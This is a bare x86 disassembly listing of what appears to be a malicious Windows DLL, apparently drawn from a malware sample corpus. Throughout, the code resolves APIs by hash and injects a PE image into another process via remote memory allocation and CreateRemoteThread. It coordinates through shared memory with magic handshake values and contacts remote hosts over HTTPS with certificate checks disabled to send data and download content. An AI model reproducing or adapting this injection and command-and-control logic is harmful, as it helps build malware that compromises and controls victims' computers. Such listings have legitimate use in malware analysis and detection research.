sub_1000100e
push ebp
mov ebp esp
push ebx
push esi
push edi
push [ ebp + 0x8 ]
xor esi esi
mov ebx 0xf001f
push esi
push ebx
call [ OpenFileMappingA@IAT ]
mov edi [ ebp + 0xc ]
mov [ edi ] eax
test eax eax
jne r-xdata
xor esi esi
inc esi
push [ ebp + 0x8 ]
push 0x1000c
push esi
push 0x4
push esi
push 0xffffffff
call [ CreateFileMappingA@IAT ]
mov [ edi ] eax
test eax eax
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
pop ebp
retn
push esi
push esi
push esi
push ebx
push eax
call [ MapViewOfFile@IAT ]
test eax eax
je r-xdata
push [ edi ]
call [ CloseHandle@IAT ]
jmp r-xdata
push eax
mov [ eax ] esi
mov [ eax + 0x4 ] 0xff000
mov [ eax + 0x8 ] esi
call [ UnmapViewOfFile@IAT ]
sub_1000107f
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push esi
xor esi esi
push edi
mov edi esi
test eax eax
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop edi
pop esi
pop ebp
retn
mov [ ecx ] esi
push esi
push esi
push esi
push 0xf001f
push eax
call [ MapViewOfFile@IAT ]
test eax eax
je r-xdata
cmp [ eax + 0x4 ] 0x1234abcd
jne r-xdata
push eax
call [ UnmapViewOfFile@IAT ]
mov esi [ eax ]
test esi esi
jne r-xdata
xor edi edi
inc edi
mov [ eax + 0x4 ] 0xdcba4321
sub_100010d6
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
xor esi esi
push esi
push 0xf001f
call [ OpenFileMappingA@IAT ]
mov ecx [ ebp + 0xc ]
mov [ ecx ] eax
test eax eax
je r-xdata
mov [ ecx ] esi
cmp eax 0xffffffff
je r-xdata
inc esi
jmp r-xdata
mov eax esi
pop esi
pop ebp
retn
sub_10001103
push ebp
mov ebp esp
push ecx
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
mov ecx edi
mov [ ebp - 0x4 ] ecx
test eax eax
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
cmp eax 0xffffffff
je r-xdata
mov eax edi
pop edi
mov esp ebp
pop ebp
retn
mov [ eax ] ecx
push esi
push edi
push edi
push edi
push 0xf001f
push eax
call [ MapViewOfFile@IAT ]
mov esi eax
test esi esi
je r-xdata
mov ecx edi
cmp [ esi + 0x4 ] 0x1234abcd
jne r-xdata
push esi
call [ UnmapViewOfFile@IAT ]
mov ecx [ ebp - 0x4 ]
jmp r-xdata
mov eax [ ebp + 0x10 ]
mov ecx [ esi ]
cmp [ eax ] ecx
jb r-xdata
pop esi
xor eax eax
mov [ esi + 0x4 ] 0xdcba4321
inc eax
push ebx
mov ebx edi
test ecx ecx
je r-xdata
mov edi eax
test ebx ebx
jne r-xdata
mov [ esi ] edi
mov [ esi + 0x4 ] 0xff000
mov [ esi + 0x8 ] edi
jmp r-xdata
cmp [ esi + 0x4 ] 0x98761234
mov [ ebp + 0x8 ] edi
je r-xdata
pop ebx
push [ esi + 0x8 ]
lea eax [ esi + 0xc ]
push eax
push [ ebp + 0xc ]
call sub_10003373
mov eax [ esi + 0x8 ]
add esp 0xc
add [ ebp + 0xc ] eax
add [ ebp - 0x4 ] eax
sub [ esi ] eax
mov [ esi + 0x4 ] 0x43216789
test ebx ebx
jne r-xdata
test ebx ebx
je r-xdata
cmp [ esi ] edi
jne r-xdata
push 0xc8
call [ Sleep@IAT ]
mov eax [ ebp + 0x8 ]
inc eax
cmp eax 0x258
mov [ ebp + 0x8 ] eax
push 0x1
pop eax
cmove ebx eax
cmp [ esi + 0x4 ] 0x98761234
jne r-xdata
xor eax eax
inc eax
test ebx ebx
jne r-xdata
sub_10001205
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push edi
xor edi edi
test eax eax
je r-xdata
mov eax edi
pop edi
pop ebp
retn
cmp eax 0xffffffff
je r-xdata
push esi
push edi
push edi
push edi
push 0xf001f
push eax
call [ MapViewOfFile@IAT ]
mov esi eax
test esi esi
je r-xdata
pop esi
cmp [ esi + 0x4 ] 0xff000
jne r-xdata
push esi
call [ UnmapViewOfFile@IAT ]
mov eax [ ebp + 0x10 ]
push ebx
mov [ esi ] eax
mov ebx edi
mov [ esi + 0x4 ] 0x1234abcd
mov [ ebp + 0x8 ] edi
pop ebx
push 0xc8
call [ Sleep@IAT ]
mov eax [ ebp + 0x8 ]
inc eax
cmp eax 0x258
mov [ ebp + 0x8 ] eax
push 0x1
pop eax
cmove ebx eax
cmp [ esi + 0x4 ] 0xdcba4321
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
jne r-xdata
jmp r-xdata
cmp [ esi ] edi
jne r-xdata
test ebx ebx
jne r-xdata
test ebx ebx
mov [ esi ] edi
mov [ esi + 0x8 ] edi
mov [ esi + 0x4 ] 0xff000
cmove edi eax
mov eax [ esi ]
cmp eax 0x10000
jae r-xdata
mov [ esi + 0x8 ] 0x10000
mov [ esi + 0x8 ] eax
jmp r-xdata
push 0xc8
call [ Sleep@IAT ]
mov eax [ ebp + 0x8 ]
inc eax
cmp eax 0x258
mov [ ebp + 0x8 ] eax
push 0x1
pop eax
cmove ebx eax
cmp [ esi + 0x4 ] 0x43216789
jne r-xdata
push [ esi + 0x8 ]
lea eax [ esi + 0xc ]
push [ ebp + 0xc ]
push eax
call sub_10003373
mov eax [ ebp + 0xc ]
add esp 0xc
add eax [ esi + 0x8 ]
mov [ ebp + 0xc ] eax
xor eax eax
mov [ esi + 0x4 ] 0x98761234
inc eax
mov [ ebp + 0x8 ] edi
test ebx ebx
jne r-xdata
sub_1000131e
push ebp
mov ebp esp
push ecx
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp edi 0xffffffff
je r-xdata
cmp [ ebp + 0xc ] esi
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
push edi
call [ GetExitCodeProcess@IAT ]
cmp [ ebp + 0x8 ] 0x103
jne r-xdata
push esi
push 0x1
push 0xa4137e37
call sub_100027c6
add esp 0xc
test eax eax
je r-xdata
push esi
push 0x1
push 0xb9016a44
push eax
call sub_1000281e
add esp 0x10
test eax eax
je r-xdata
push 0x8000
lea ecx [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push ecx
lea ecx [ ebp + 0xc ]
push ecx
push edi
call eax
mov esi eax
neg esi
sbb esi esi
inc esi
sub_10001399
push ebp
mov ebp esp
sub esp 0x14
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
test esi esi
je r-xdata
mov eax edi
pop edi
pop esi
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] edi
je r-xdata
push ebx
push edi
push 0x1
push 0xa4137e37
call sub_100027c6
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
pop ebx
push edi
push 0x1
push 0x77b826b3
push ebx
call sub_1000281e
push edi
push 0x1
push 0x2e33c8ac
push ebx
mov [ ebp - 0xc ] eax
call sub_1000281e
push edi
push 0x1
push 0xb9016a44
push ebx
mov [ ebp - 0x10 ] eax
call sub_1000281e
add esp 0x30
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0xc ] edi
je r-xdata
cmp [ ebp - 0x10 ] edi
je r-xdata
test eax eax
je r-xdata
push sub_10001399
call sub_10002686
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax 0x5a4d
cmp [ ebx ] ax
jne r-xdata
mov eax [ ebx + 0x3c ]
cmp [ eax + ebx ] 0x4550
jne r-xdata
mov eax [ eax + ebx + 0x50 ]
push 0x40
push 0x3000
mov [ ebp - 0x8 ] eax
mov [ ebp - 0x4 ] eax
lea eax [ ebp - 0x4 ]
push eax
push edi
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] edi
push eax
push esi
call [ ebp - 0xc ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp - 0x4 ] eax
jb r-xdata
push eax
call sub_10002b17
push [ ebp - 0x8 ]
mov [ ebp - 0xc ] eax
push ebx
push eax
call sub_10002bb6
push [ ebp + 0x8 ]
push [ ebp - 0xc ]
call sub_10002df6
add esp 0x18
test eax eax
je r-xdata
push 0x8000
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] edi
push eax
lea eax [ ebp + 0x8 ]
push eax
push esi
call [ ebp - 0x14 ]
push edi
push [ ebp - 0x8 ]
push [ ebp - 0xc ]
push [ ebp + 0x8 ]
push esi
call [ ebp - 0x10 ]
test eax eax
jne r-xdata
mov [ ebp - 0x10 ] edi
cmp esi 0xffffffff
jne r-xdata
mov eax [ ebp + 0x8 ]
push edi
push edi
push [ ebp + 0x8 ]
sub eax ebx
add eax sub_1000168b
push eax
push edi
push edi
push esi
call [ CreateRemoteThread@IAT ]
mov esi eax
push 0x7530
push esi
call [ WaitForSingleObject@IAT ]
lea eax [ ebp - 0x10 ]
push eax
push esi
call [ GetExitCodeThread@IAT ]
mov eax [ ebp - 0x10 ]
push [ ebp + 0x8 ]
call sub_10002cd2
pop ecx
jmp r-xdata
push [ ebp - 0xc ]
call sub_10002c4c
pop ecx
mov ecx [ ebp + 0xc ]
xor edi edi
mov eax [ ebp + 0x8 ]
inc edi
mov [ ecx ] eax
jmp r-xdata
cmp eax 0x1
jne r-xdata
sub_10001541
push ebp
mov ebp esp
sub esp 0x14
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
cmp [ ebp + 0xc ] esi
je r-xdata
push ebx
push esi
push 0x1
push 0xa4137e37
call sub_100027c6
mov ebx eax
add esp 0xc
test ebx ebx
je r-xdata
pop ebx
push esi
push 0x1
push 0x77b826b3
push ebx
call sub_1000281e
push esi
push 0x1
push 0x2e33c8ac
push ebx
mov [ ebp - 0xc ] eax
call sub_1000281e
push esi
push 0x1
push 0xb9016a44
push ebx
mov [ ebp - 0x10 ] eax
call sub_1000281e
add esp 0x30
mov [ ebp - 0x14 ] eax
cmp [ ebp - 0xc ] esi
je r-xdata
cmp [ ebp - 0x10 ] esi
je r-xdata
test eax eax
je r-xdata
push sub_10001399
call sub_10002686
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov eax 0x5a4d
cmp [ ebx ] ax
jne r-xdata
mov eax [ ebx + 0x3c ]
cmp [ eax + ebx ] 0x4550
jne r-xdata
mov eax [ eax + ebx + 0x50 ]
push 0x40
push 0x3000
mov [ ebp - 0x8 ] eax
mov [ ebp + 0x8 ] eax
lea eax [ ebp + 0x8 ]
push eax
push esi
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push eax
push edi
call [ ebp - 0xc ]
test eax eax
jne r-xdata
mov eax [ ebp - 0x8 ]
cmp [ ebp + 0x8 ] eax
jb r-xdata
push eax
call sub_10002b17
push [ ebp - 0x8 ]
push ebx
mov ebx eax
push ebx
call sub_10002bb6
push [ ebp - 0x4 ]
push ebx
call sub_10002df6
add esp 0x18
test eax eax
je r-xdata
push 0x8000
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
lea eax [ ebp - 0x4 ]
push eax
push edi
call [ ebp - 0x14 ]
push esi
push [ ebp - 0x8 ]
push ebx
push [ ebp - 0x4 ]
push edi
call [ ebp - 0x10 ]
test eax eax
jne r-xdata
mov ecx [ ebp + 0xc ]
inc esi
mov eax [ ebp - 0x4 ]
mov [ ecx ] eax
jmp r-xdata
push ebx
call sub_10002c4c
pop ecx
sub_1000169b
push ebp
mov ebp esp
push esi
push edi
mov edi [ ebp + 0x8 ]
xor esi esi
test edi edi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebp
retn
cmp [ ebp + 0xc ] esi
je r-xdata
push ebx
mov ebx [ ebp + 0x10 ]
test ebx ebx
je r-xdata
pop ebx
cmp edi 0xffffffff
jne r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
push edi
call [ GetExitCodeProcess@IAT ]
cmp [ ebp + 0x8 ] 0x103
jne r-xdata
push esi
push esi
push [ ebp + 0x14 ]
push ebx
push esi
push esi
call [ CreateThread@IAT ]
jmp r-xdata
push sub_10001399
call sub_10002686
pop ecx
mov ecx [ ebp + 0xc ]
push esi
push esi
push [ ebp + 0x14 ]
add ecx ebx
sub ecx eax
push ecx
push esi
push esi
push edi
call [ CreateRemoteThread@IAT ]
mov esi eax
sub_1000170c
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x0
je r-xdata
cmp [ esi + 0x8 ] 0x0
je r-xdata
push [ esi ]
call sub_10002c4c
pop ecx
cmp [ esi + 0xc ] 0x0
je r-xdata
push [ esi + 0x8 ]
call sub_10002c4c
pop ecx
cmp [ esi + 0x10 ] 0x0
je r-xdata
push [ esi + 0xc ]
call sub_10002c4c
pop ecx
cmp [ esi + 0x14 ] 0x0
je r-xdata
push [ esi + 0x10 ]
call sub_10002c4c
pop ecx
cmp [ esi + 0x18 ] 0x0
je r-xdata
push [ esi + 0x14 ]
call sub_10002c4c
pop ecx
cmp [ esi + 0x1c ] 0x0
je r-xdata
push [ esi + 0x18 ]
call sub_10002c4c
pop ecx
cmp [ esi + 0x20 ] 0x0
je r-xdata
push [ esi + 0x1c ]
call sub_10002c4c
pop ecx
cmp [ esi + 0x24 ] 0x0
je r-xdata
push [ esi + 0x20 ]
call sub_10002c4c
pop ecx
pop esi
pop ebp
retn
push [ esi + 0x24 ]
call sub_10002c4c
pop ecx
sub_1000179b
push ebp
mov ebp esp
push esi
mov esi [ ebp + 0x8 ]
push edi
xor edi edi
mov ecx edi
test esi esi
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop edi
mov eax ecx
pop esi
pop ebp
retn
mov [ eax ] edi
push ebx
lea ebx [ esi + eax ]
mov ecx esi
cmp esi ebx
jae r-xdata
mov eax edi
shl eax 0x3
push eax
call sub_10002b17
pop ecx
mov ecx eax
cmp esi ebx
jae r-xdata
mov eax [ ecx ]
inc edi
add ecx 0x4
add ecx eax
cmp ecx ebx
jb r-xdata
pop ebx
lea edx [ ecx + 0x4 ]
mov eax [ esi ]
add esi 0x4
mov [ edx ] eax
xor eax eax
cmp [ edx ] eax
cmovne eax esi
add esi [ edx ]
mov [ edx - 0x4 ] eax
lea edx [ edx + 0x8 ]
cmp esi ebx
jb r-xdata
sub_10001807
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor edi edi
lea eax [ ebp - 0x18 ]
mov esi edi
mov [ ebp - 0xc ] edi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] edi
call sub_10002eb4
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push ebx
call sub_10001399
pop ecx
pop ecx
cmp [ ebp - 0x8 ] esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edi
push ebx
call sub_10002f19
mov esi [ ebp - 0x14 ]
pop ecx
push edi
push sub_10001ba0
push [ ebp - 0x8 ]
push ebx
call sub_1000169b
add esp 0x10
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push [ ebp - 0x8 ]
push ebx
call sub_1000131e
pop ecx
pop ecx
mov ecx edi
mov [ ebp - 0x4 ] ecx
test ecx ecx
je r-xdata
push 0xc8
call [ Sleep@IAT ]
lea eax [ ebp - 0x4 ]
inc esi
push eax
push r--data
call sub_100010d6
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
push 0x1d4c0
push [ ebp - 0x10 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x10 ]
mov esi eax
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push ecx
call sub_10002290
pop ecx
pop ecx
test eax eax
je r-xdata
cmp esi 0x258
je r-xdata
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x4 ]
call sub_10001f6c
mov edi [ ebp - 0xc ]
add esp 0xc
sub_10001908
push ebp
mov ebp esp
sub esp 0x18
push ebx
push esi
push edi
xor edi edi
lea eax [ ebp - 0x18 ]
mov esi edi
mov [ ebp - 0xc ] edi
push eax
mov [ ebp - 0x14 ] esi
mov [ ebp - 0x18 ] edi
call sub_10002eb4
mov ebx eax
pop ecx
test ebx ebx
je r-xdata
mov ecx [ ebp + 0xc ]
test ecx ecx
je r-xdata
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] edi
push eax
push ebx
call sub_10001399
pop ecx
pop ecx
cmp [ ebp - 0x8 ] esi
je r-xdata
pop edi
mov eax esi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov [ ecx ] edi
push ebx
call sub_10002f19
mov esi [ ebp - 0x14 ]
pop ecx
push edi
push sub_10001a09
push [ ebp - 0x8 ]
push ebx
call sub_1000169b
add esp 0x10
mov [ ebp - 0x10 ] eax
test eax eax
je r-xdata
push [ ebp - 0x8 ]
push ebx
call sub_1000131e
pop ecx
pop ecx
mov ecx edi
mov [ ebp - 0x4 ] ecx
test ecx ecx
je r-xdata
push 0xc8
call [ Sleep@IAT ]
lea eax [ ebp - 0x4 ]
inc esi
push eax
push r--data
call sub_100010d6
pop ecx
pop ecx
mov ecx [ ebp - 0x4 ]
test ecx ecx
je r-xdata
push 0x1d4c0
push [ ebp - 0x10 ]
call [ WaitForSingleObject@IAT ]
push [ ebp - 0x10 ]
mov esi eax
call [ CloseHandle@IAT ]
test esi esi
jne r-xdata
push [ ebp + 0x8 ]
push ecx
call sub_10002290
pop ecx
pop ecx
test eax eax
je r-xdata
cmp esi 0x258
je r-xdata
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea eax [ ebp - 0x14 ]
push eax
push [ ebp - 0x4 ]
call sub_10001f6c
mov edi [ ebp - 0xc ]
add esp 0xc
sub_10001a09
push ebp
mov ebp esp
sub esp 0x68
push ebx
lea eax [ ebp - 0x8 ]
xor ebx ebx
push eax
push r--data
mov [ ebp - 0x8 ] ebx
call sub_1000100e
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x8 ] ebx
je r-xdata
push esi
push edi
push [ ebp - 0x8 ]
lea eax [ ebp - 0x68 ]
push eax
call sub_10001d76
pop ecx
pop ecx
push 0xa
pop ecx
push ebx
push ebx
mov esi eax
lea edi [ ebp - 0x40 ]
[ edi ] [ esi ]
push [ ebp - 0x38 ]
push [ ebp - 0x3c ]
push [ ebp - 0x40 ]
call [ InternetOpenA@IAT ]
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x1bb
push [ ebp - 0x34 ]
mov [ ebp - 0x18 ] eax
push eax
call [ InternetConnectA@IAT ]
push [ ebp - 0x30 ]
mov edi eax
mov [ ebp - 0x14 ] edi
call sub_10002ed5
pop ecx
test eax eax
je r-xdata
push ebx
push 0x800000
push ebx
push ebx
push ebx
push [ ebp - 0x24 ]
push [ ebp - 0x28 ]
push edi
call [ HttpOpenRequestA@IAT ]
mov esi eax
push esi
call sub_10001e93
push [ ebp - 0x1c ]
call sub_10002ed5
pop ecx
pop ecx
push eax
push [ ebp - 0x1c ]
push ebx
push ebx
push esi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x2c ]
call sub_10002ed5
pop ecx
test eax eax
je r-xdata
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push edi
call esi
push [ ebp - 0x18 ]
call esi
lea eax [ ebp - 0x40 ]
push eax
call sub_1000170c
push [ ebp - 0x8 ]
call sub_10001000
pop ecx
pop ecx
pop edi
pop esi
or [ ebp - 0x4 ] 0xffffffff
push 0x10000
call sub_10002b17
pop ecx
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] ebx
cmp [ ebp - 0x4 ] ebx
je r-xdata
push [ ebp - 0x30 ]
call sub_10002ed5
mov esi [ InternetSetOptionA@IAT ]
pop ecx
push eax
push [ ebp - 0x30 ]
push 0x2b
push edi
call esi
push [ ebp - 0x2c ]
call sub_10002ed5
pop ecx
push eax
push [ ebp - 0x2c ]
push 0x2c
push edi
call esi
push eax
call sub_10002c4c
push ebx
push [ ebp - 0xc ]
push [ ebp - 0x8 ]
call sub_10001fee
add esp 0x10
mov edi eax
mov edi [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
add eax ebx
push eax
push [ ebp - 0xc ]
call sub_10002c6a
push [ ebp - 0x4 ]
mov [ ebp - 0xc ] eax
push edi
lea ecx [ eax + ebx ]
push ecx
call sub_10003373
add ebx [ ebp - 0x4 ]
add esp 0x14
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
lea eax [ ebp - 0x4 ]
push eax
push 0x10000
push edi
push esi
call [ InternetReadFile@IAT ]
mov eax [ ebp - 0x4 ]
test eax eax
je r-xdata
sub_10001ba0
push ebp
mov ebp esp
sub esp 0x6c
push ebx
lea eax [ ebp - 0x4 ]
xor ebx ebx
push eax
push r--data
mov [ ebp - 0x4 ] ebx
call sub_1000100e
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
pop ebx
mov esp ebp
pop ebp
retn 0x4
cmp [ ebp - 0x4 ] ebx
je r-xdata
push esi
push edi
push [ ebp - 0x4 ]
lea eax [ ebp - 0x6c ]
push eax
call sub_10001d76
pop ecx
pop ecx
push 0xa
pop ecx
push ebx
push ebx
mov esi eax
lea edi [ ebp - 0x44 ]
[ edi ] [ esi ]
push [ ebp - 0x3c ]
push [ ebp - 0x40 ]
push [ ebp - 0x44 ]
call [ InternetOpenA@IAT ]
push ebx
push ebx
push 0x3
push ebx
push ebx
push 0x1bb
push [ ebp - 0x38 ]
mov [ ebp - 0x1c ] eax
push eax
call [ InternetConnectA@IAT ]
push [ ebp - 0x34 ]
mov edi eax
mov [ ebp - 0x18 ] edi
call sub_10002ed5
pop ecx
test eax eax
je r-xdata
push ebx
push 0x800000
push ebx
push ebx
push ebx
push [ ebp - 0x28 ]
push [ ebp - 0x2c ]
push edi
call [ HttpOpenRequestA@IAT ]
mov esi eax
push esi
call sub_10001e93
push [ ebp - 0x20 ]
call sub_10002ed5
pop ecx
pop ecx
push eax
push [ ebp - 0x20 ]
push ebx
push ebx
push esi
call [ HttpSendRequestA@IAT ]
test eax eax
je r-xdata
push [ ebp - 0x30 ]
call sub_10002ed5
pop ecx
test eax eax
je r-xdata
push esi
mov esi [ InternetCloseHandle@IAT ]
call esi
push edi
call esi
push [ ebp - 0x1c ]
call esi
lea eax [ ebp - 0x44 ]
push eax
call sub_1000170c
push [ ebp - 0x4 ]
call sub_10001000
pop ecx
pop ecx
pop edi
pop esi
push ebx
lea eax [ ebp - 0xc ]
mov [ ebp - 0x14 ] ebx
push eax
lea eax [ ebp - 0x14 ]
mov [ ebp - 0xc ] 0x4
push eax
push 0x20000013
push esi
call [ HttpQueryInfoA@IAT ]
cmp [ ebp - 0x14 ] 0xc8
jne r-xdata
push [ ebp - 0x34 ]
call sub_10002ed5
mov esi [ InternetSetOptionA@IAT ]
pop ecx
push eax
push [ ebp - 0x34 ]
push 0x2b
push edi
call esi
push [ ebp - 0x30 ]
call sub_10002ed5
pop ecx
push eax
push [ ebp - 0x30 ]
push 0x2c
push edi
call esi
push 0x1
push r--data
push [ ebp - 0x4 ]
call sub_10001fee
add esp 0xc
push ebx
lea eax [ ebp - 0xc ]
mov [ ebp - 0xc ] 0x4
push eax
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] ebx
push eax
push 0x20000005
push esi
call [ HttpQueryInfoA@IAT ]
test eax eax
je r-xdata
cmp [ ebp - 0x8 ] 0x24
jbe r-xdata
push [ ebp - 0x8 ]
call sub_10002b17
pop ecx
mov ecx [ ebp - 0x8 ]
mov edi eax
mov [ ebp - 0x10 ] ebx
cmp ebx ecx
jne r-xdata
cmp ebx ecx
jb r-xdata
push edi
call sub_10002c4c
mov edi [ ebp - 0x18 ]
pop ecx
jmp r-xdata
push ecx
push edi
push [ ebp - 0x4 ]
call sub_10001fee
add esp 0xc
lea eax [ ebp - 0x10 ]
push eax
push ecx
lea eax [ ebx + edi ]
push eax
push esi
call [ InternetReadFile@IAT ]
add ebx [ ebp - 0x10 ]
cmp [ ebp - 0x10 ] 0x0
mov ecx [ ebp - 0x8 ]
je r-xdata
sub_10001d76
push ebp
mov ebp esp
push ecx
push ebx
mov ebx [ ebp + 0x8 ]
xor eax eax
push esi
push edi
push 0x9
xor esi esi
lea edi [ ebx + 0x4 ]
pop ecx
mov [ ebx ] esi
[ edi ]
lea eax [ ebp - 0x4 ]
mov [ ebp - 0x4 ] esi
push eax
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
push [ ebp + 0xc ]
call sub_10001f6c
add esp 0xc
test eax eax
je r-xdata
pop edi
pop esi
mov eax ebx
pop ebx
mov esp ebp
pop ebp
retn
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
lea eax [ ebp + 0x8 ]
mov [ ebp + 0x8 ] esi
push eax
push [ ebp - 0x4 ]
push edi
call sub_1000179b
mov esi eax
add esp 0xc
test esi esi
je r-xdata
push edi
call sub_10002c4c
pop ecx
cmp [ ebp + 0x8 ] 0x0
je r-xdata
mov eax [ esi + 0x4 ]
inc eax
push eax
push [ esi ]
call sub_10002ca4
mov [ ebx ] eax
mov eax [ esi + 0x8 ]
mov eax [ eax ]
mov [ ebx + 0x4 ] eax
mov eax [ esi + 0x14 ]
inc eax
push eax
push [ esi + 0x10 ]
call sub_10002ca4
mov [ ebx + 0x8 ] eax
mov eax [ esi + 0x1c ]
inc eax
push eax
push [ esi + 0x18 ]
call sub_10002ca4
mov [ ebx + 0xc ] eax
mov eax [ esi + 0x24 ]
inc eax
push eax
push [ esi + 0x20 ]
call sub_10002ca4
mov [ ebx + 0x10 ] eax
mov eax [ esi + 0x2c ]
inc eax
push eax
push [ esi + 0x28 ]
call sub_10002ca4
mov [ ebx + 0x14 ] eax
mov eax [ esi + 0x34 ]
inc eax
push eax
push [ esi + 0x30 ]
call sub_10002ca4
mov [ ebx + 0x18 ] eax
mov eax [ esi + 0x3c ]
inc eax
push eax
push [ esi + 0x38 ]
call sub_10002ca4
mov [ ebx + 0x1c ] eax
mov eax [ esi + 0x44 ]
inc eax
push eax
push [ esi + 0x40 ]
call sub_10002ca4
mov [ ebx + 0x20 ] eax
add esp 0x40
mov eax [ esi + 0x4c ]
inc eax
push eax
push [ esi + 0x48 ]
call sub_10002ca4
push esi
mov [ ebx + 0x24 ] eax
call sub_10002c4c
add esp 0xc
sub_10001e93
push ebp
mov ebp esp
push ecx
push ecx
lea eax [ ebp - 0x8 ]
mov [ ebp - 0x8 ] 0x4
push eax
lea eax [ ebp - 0x4 ]
push eax
push 0x1f
push [ ebp + 0x8 ]
call [ InternetQueryOptionA@IAT ]
or [ ebp - 0x4 ] 0x3180
lea eax [ ebp - 0x4 ]
push 0x4
push eax
push 0x1f
push [ ebp + 0x8 ]
call [ InternetSetOptionA@IAT ]
mov esp ebp
pop ebp
retn
sub_10001ece
push ebp
mov ebp esp
push ecx
push ecx
push ebx
xor ebx ebx
push edi
mov edi [ ebp + 0x8 ]
mov ecx ebx
mov [ ebp - 0x4 ] ebx
test edi edi
je r-xdata
mov eax [ ebp + 0x10 ]
test eax eax
je r-xdata
mov eax [ ebp + 0xc ]
test eax eax
je r-xdata
pop edi
mov eax ecx
pop ebx
mov esp ebp
pop ebp
retn
mov [ eax ] ebx
push esi
lea esi [ edi + eax * 8 ]
mov ecx edi
cmp edi esi
jae r-xdata
push ebx
call sub_10002b17
pop ecx
mov ecx eax
mov [ ebp + 0x8 ] ecx
cmp edi esi
jae r-xdata
add ebx 0x4
add ebx [ ecx + 0x4 ]
add ecx 0x8
cmp ecx esi
jb r-xdata
pop esi
sub esi edi
lea ecx [ edi + 0x4 ]
dec esi
mov edi ecx
shr esi 0x3
mov ebx eax
inc esi
mov [ ebp - 0x4 ] ebx
add edi 0x8
sub esi 0x1
jne r-xdata
cmp [ edi ] 0x0
je r-xdata
push 0x4
push edi
push ebx
call sub_10002bb6
add esp 0xc
add ebx 0x4
cmp [ edi - 0x4 ] 0x0
je r-xdata
mov ebx [ ebp - 0x4 ]
mov ecx [ ebp + 0x8 ]
push [ edi ]
push [ edi - 0x4 ]
push ebx
call sub_10002bb6
add esp 0xc
add ebx [ edi ]
sub_10001f6c
push ebp
mov ebp esp
push ecx
push esi
xor eax eax
push edi
mov edi [ ebp + 0xc ]
mov esi eax
mov [ ebp - 0x4 ] eax
test edi edi
je r-xdata
mov ecx [ ebp + 0x10 ]
test ecx ecx
je r-xdata
push ebx
mov [ edi ] eax
mov ebx eax
pop edi
mov eax esi
pop esi
mov esp ebp
pop ebp
retn
mov [ ecx ] eax
pop ebx
push 0xc8
call [ Sleep@IAT ]
lea eax [ ebp - 0x4 ]
inc ebx
push eax
push [ ebp + 0x8 ]
call sub_1000107f
pop ecx
test eax eax
mov eax [ ebp - 0x4 ]
pop ecx
je r-xdata
cmp ebx 0x258
jne r-xdata
test eax eax
je r-xdata
test esi esi
jne r-xdata
xor esi esi
inc esi
inc eax
push eax
mov [ ebp - 0x4 ] eax
call sub_10002b17
